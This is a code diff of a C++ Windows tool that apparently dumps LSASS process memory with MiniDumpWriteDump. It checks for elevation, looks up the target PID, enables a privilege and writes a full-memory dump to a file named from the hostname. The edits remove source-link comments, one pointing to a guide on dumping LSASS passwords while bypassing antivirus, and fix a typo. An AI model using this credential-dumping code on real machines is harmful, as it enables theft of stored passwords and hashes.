@@ -10,7 +10,6 @@
 using namespace std;
 
 
-// Source: https://stackoverflow.com/questions/11491933/openprocess-returns-null-every-time-in-c
 BOOL IsElevatedProcess()
 {
 	BOOL is_elevated = FALSE;
@@ -32,7 +31,6 @@ BOOL IsElevatedProcess()
 }
 
 
-// Source: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
 DWORD getProcessPid()
 {
 	DWORD processPID = 0;
@@ -60,7 +58,6 @@ DWORD getProcessPid()
 }
 
 
-// Source: https://www.unknowncheats.me/forum/1872353-post36.html
 bool SetPrivilege()
 {
 	// Generate privilege name object
@@ -108,7 +105,6 @@ EXIT:
 }
 
 
-// Source: https://www.youtube.com/watch?v=Z7ahuHV5eXY&ab_channel=RabieHammoud
 string getHostname() {
 	TCHAR compname[UNCLEN + 1];
 	DWORD compname_len = UNCLEN + 1;
@@ -119,7 +115,6 @@ string getHostname() {
 }
 
 
-// Source for tm struct in case you want to add or delete something: https://www.cplusplus.com/reference/ctime/tm/
 string getFileName(string hostname) {
 	// Extension of the file
 	string extension = ".txt";
@@ -155,7 +150,7 @@ string getFileName(string hostname) {
 int main(int argc, char** argv) {
 	// Check elevated process
 	if (!IsElevatedProcess()) {
-		wcout << "[-] Error: Execute with administrative provileges." << endl;
+		wcout << "[-] Error: Execute with administrative privileges." << endl;
 		return 1;
 	}
 
@@ -174,7 +169,6 @@ int main(int argc, char** argv) {
 		string hostname = getHostname();
 		filename = getFileName(hostname);
 	}
-	// Source: https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
 	std::wstring stemp = std::wstring(filename.begin(), filename.end());
 	LPCWSTR pointer_filename = stemp.c_str();
 
@@ -195,7 +189,6 @@ int main(int argc, char** argv) {
 	// Dump process
 	if (processHandle && processHandle != INVALID_HANDLE_VALUE) {
 		wcout << "[+] Handle to process created correctly." << endl;
-		// From https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_type - MiniDumpWithFullMemory = 0x00000002
 		BOOL isDumped = MiniDumpWriteDump(processHandle, processPID, outFile, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
 		if (isDumped) {
 			cout << "[+] Successfully dumped process with pid " << processPID << " to file " << filename << endl;
